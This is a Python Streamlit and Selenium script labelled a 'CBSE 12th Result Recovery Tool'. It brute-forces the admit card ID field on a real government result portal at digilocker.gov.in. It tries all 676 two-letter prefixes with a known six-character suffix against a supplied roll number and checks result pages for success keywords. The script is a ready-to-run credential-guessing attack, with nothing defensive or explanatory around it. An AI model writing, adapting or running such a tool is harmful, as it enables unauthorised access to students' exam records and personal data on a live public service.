import streamlit as st
from selenium import webdriver
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from webdriver_manager.chrome import ChromeDriverManager
import time
import string

# Configuration
URL = "https://umangresults.digilocker.gov.in/CBSE12th2026resultmayzaqw.html"

def get_driver():
    chrome_options = Options()
    chrome_options.add_argument("--headless=new")
    chrome_options.add_argument("--no-sandbox")
    chrome_options.add_argument("--disable-dev-shm-usage")
    chrome_options.add_argument("--disable-gpu")
    
    service = Service(ChromeDriverManager().install())
    return webdriver.Chrome(service=service, options=chrome_options)

def is_success(driver):
    """Checks if the result page has loaded by looking for keywords or URL changes."""
    try:
        # Check for error message visibility
        error_elements = driver.find_elements(By.ID, "err_msg")
        if error_elements and error_elements[0].is_displayed() and error_elements[0].text.strip():
            return False
        
        # Check for success indicators in text
        content = driver.page_source.lower()
        success_keys = ["marks", "subject", "total", "grade", "pass", "result"]
        if any(key in content for key in success_keys):
            return True
            
        # Check if URL redirected away from the login form
        if "result" in driver.current_url.lower() and "html" not in driver.current_url.lower():
            return True
    except:
        pass
    return False

# ====================== STREAMLIT UI ======================
st.set_page_config(page_title="CBSE Brute Force Fix", layout="wide")
st.title("🔍 CBSE 12th Result Recovery Tool")

col1, col2 = st.columns(2)
with col1:
    roll_number = st.text_input("Roll Number", value="18615900")
    known_suffix = st.text_input("Known Last 6 Characters", value="004511", max_chars=6)

with col2:
    delay = st.slider("Request Delay (Seconds)", 0.5, 5.0, 2.0, 0.5)
    start_btn = st.button("🚀 Launch Recovery", type="primary")

if start_btn:
    if len(known_suffix) != 6:
        st.error("Suffix must be exactly 6 characters.")
    else:
        status_log = st.empty()
        progress_bar = st.progress(0)
        debug_area = st.expander("Attempt Logs", expanded=True)
        
        driver = get_driver()
        letters = string.ascii_uppercase
        combinations = [f"{a}{b}" for a in letters for b in letters]
        total = len(combinations)
        
        try:
            for i, prefix in enumerate(combinations):
                full_code = f"{prefix}{known_suffix}"
                
                # Update UI
                status_log.info(f"Testing Prefix: **{prefix}** ({i+1}/{total})")
                progress_bar.progress((i + 1) / total)
                
                # 1. Reset page for every attempt to avoid StaleElement errors
                driver.get(URL)
                wait = WebDriverWait(driver, 10)
                
                try:
                    # 2. Locate elements
                    roll_field = wait.until(EC.presence_of_element_located((By.ID, "rroll")))
                    admn_field = driver.find_element(By.ID, "admn_id")
                    submit_btn = driver.find_element(By.ID, "submit")
                    
                    # 3. Input and Submit
                    roll_field.clear()
                    roll_field.send_keys(roll_number)
                    admn_field.clear()
                    admn_field.send_keys(full_code)
                    submit_btn.click()
                    
                    # 4. Wait for response
                    time.sleep(delay)
                    
                    # 5. Verify
                    if is_success(driver):
                        st.balloons()
                        st.success(f"✅ SUCCESS! Admit Card ID: **{full_code}**")
                        st.code(f"Roll: {roll_number}\nID: {full_code}", language="text")
                        break
                    else:
                        debug_area.write(f"❌ {full_code}: Incorrect")
                        
                except Exception as e:
                    debug_area.error(f"⚠️ Error on {full_code}: {str(e)[:50]}")
                    continue
            else:
                st.warning("Finished all combinations. No match found.")
                
        finally:
            driver.quit()
